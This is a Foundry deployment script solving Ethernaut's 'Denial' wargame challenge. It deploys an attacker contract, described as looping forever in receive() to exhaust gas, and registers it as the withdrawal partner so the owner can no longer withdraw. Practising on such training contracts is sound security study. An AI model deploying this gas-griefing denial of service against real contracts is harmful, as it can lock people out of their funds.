// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/20-Denial/DenialAttacker.sol";

/**
 * @title Challenge 20 Solution Script
 * @notice Deploy DenialAttacker with infinite loop in receive() to grief gas
 */
contract DenialSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0xf1E3DBa9Be9489E7D60c1B6D681BDf75D075C77b;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker and set it as partner
        DenialAttacker attacker = new DenialAttacker(INSTANCE);
        attacker.setPartner();
        console.log("DenialAttacker deployed and set as partner:", address(attacker));

        vm.stopBroadcast();

        console.log("Challenge 20 completed! Owner can no longer withdraw.");
    }
}
